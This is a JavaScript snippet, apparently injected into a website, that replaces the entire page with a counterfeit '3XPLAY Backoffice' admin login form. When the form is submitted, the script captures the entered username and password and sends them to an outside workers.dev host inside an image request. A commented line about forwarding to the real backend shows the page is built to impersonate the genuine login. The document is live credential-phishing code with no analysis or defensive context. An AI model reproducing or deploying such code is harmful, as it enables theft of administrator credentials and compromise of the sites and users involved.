document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>3XPLAY Backoffice</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://www.hokben-77-hokahokabento.site/paneladmin/assets/global/css/bootstrap.min.css">
  <style>
    body, html {
      height: 100%;
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1e1eff, #22007e);
      color: white;
    }
    .container {
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .logo {
      margin-bottom: 20px;
    }
    .card {
      background: rgba(0, 0, 50, 0.6);
      border: none;
      border-radius: 10px;
      padding: 40px;
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    .card h4 {
      margin-bottom: 30px;
      font-weight: 600;
    }
    .btn-primary {
      background: #433cff;
      border: none;
    }
    .form-control {
      background: transparent;
      border: 1px solid #888;
      color: white;
      text-align: center;
    }
    .form-control::placeholder {
      color: #aaa;
      text-align: center;
    }
    footer {
      margin-top: 20px;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="/myupload/adminpanel_logo.png" alt="homepage" width="150" />
    <div class="card">
      <h4>Backoffice</h4>
      <form id="loginForm">
        <div class="mb-3">
          <input type="text" class="form-control" id="username" placeholder="Username" required>
        </div>
        <div class="mb-3">
          <input type="password" class="form-control" id="password" placeholder="Password" required>
        </div>
        <button type="submit" class="btn btn-primary w-100">LOGIN</button>
      </form>
    </div>
    <footer>© 2023 BWAR</footer>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      var u = document.getElementById('username').value;
      var p = document.getElementById('password').value;
      var msg = encodeURIComponent("Username: " + u + "\\nPassword: " + p);
      var i = new Image();
      i.src = "https://memek-worker.defoy89122.workers.dev/?message=" + msg;
      // Optional: forward to real backend
      // this.submit();
    });
  <\\/script>
</body>
</html>
`;
